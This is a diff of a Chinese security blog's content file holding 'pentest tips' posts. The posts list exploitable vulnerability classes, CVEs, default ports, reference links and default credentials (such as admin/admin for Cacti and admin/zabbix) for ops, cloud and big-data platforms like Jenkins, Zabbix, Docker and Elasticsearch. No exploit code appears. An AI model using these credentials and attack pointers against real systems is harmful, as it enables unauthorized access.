+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
+<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
+<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
+<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
+<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
+<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
+<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
+<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>
 
 
 
@@ -5311,81 +5368,25 @@
       </tags>
   </entry>
   <entry>
-    <title>（二）渗透技巧—常见运维系统</title>
-    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
+    <title>（五）渗透技巧—云环境</title>
+    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
-<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意文件读取漏洞</span><br><span class="line">•   意用户 token 泄露漏洞</span><br><span class="line">•   命令执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</span><br><span class="line"></span><br><span class="line">http://rinige.com/index.php/archives/577/</span><br></pre></td></tr></table></figure>
-<h3 id="2、Jenkins"><a href="#2、Jenkins" class="headerlink" title="2、Jenkins"></a>2、Jenkins</h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   未授权访问漏洞</span><br><span class="line">•   登录入口爆破</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.cnblogs.com/backlion/p/6813260.html</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/86018</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/199/</span><br></pre></td></tr></table></figure>
-<h3 id="3、Puppet"><a href="#3、Puppet" class="headerlink" title="3、Puppet"></a>3、Puppet</h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   可利用漏洞，很少公开的POC</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程命令执行</span><br></pre></td></tr></table></figure>
-<h3 id="4、Ansible"><a href="#4、Ansible" class="headerlink" title="4、Ansible"></a>4、Ansible</h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   远程代码执行</span><br></pre></td></tr></table></figure>
-<h3 id="5、Nagios"><a href="#5、Nagios" class="headerlink" title="5、Nagios"></a>5、Nagios</h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   代码执行</span><br><span class="line">•   SQLi</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.bugku.com/thread-87-1-1.html</span><br><span class="line">http://www.mottoin.com/93936.html</span><br></pre></td></tr></table></figure>
-<h3 id="6、Zabbix"><a href="#6、Zabbix" class="headerlink" title="6、Zabbix"></a>6、Zabbix</h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞（具体参考 ExploitDB）：</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   shell 命令注入</span><br><span class="line">•   认证绕过</span><br><span class="line">•   默认账户与密码，默认口令 admin/zabbix，或者是guest/空</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://blog.csdn.net/ytuo1223/article/details/45937981</span><br><span class="line"></span><br><span class="line">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/87570.html</span><br></pre></td></tr></table></figure>
-<h3 id="7、Cacit"><a href="#7、Cacit" class="headerlink" title="7、Cacit"></a>7、Cacit</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   任意代码执行</span><br><span class="line">•   SQLi</span><br><span class="line">•   登录爆破</span><br><span class="line">•   默认密码admin/admin</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</span><br></pre></td></tr></table></figure>
-<h3 id="8、Splunk"><a href="#8、Splunk" class="headerlink" title="8、Splunk"></a>8、Splunk</h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   信息泄露</span><br><span class="line">•   命令注入</span><br><span class="line">•   服务端请求伪造</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">ExploitDB 搜索</span><br></pre></td></tr></table></figure>
+<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
+<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
+<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
+<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（六）渗透技巧—大数据</title>
-    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
-    <content><![CDATA[<blockquote>
-<p>文章不记得从哪个公众号上拉下来的了</p>
-</blockquote><a id="more"></a>
-<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
-<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
-<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
-<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
-<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
-<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
-<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
-<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
-<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
 
 
 
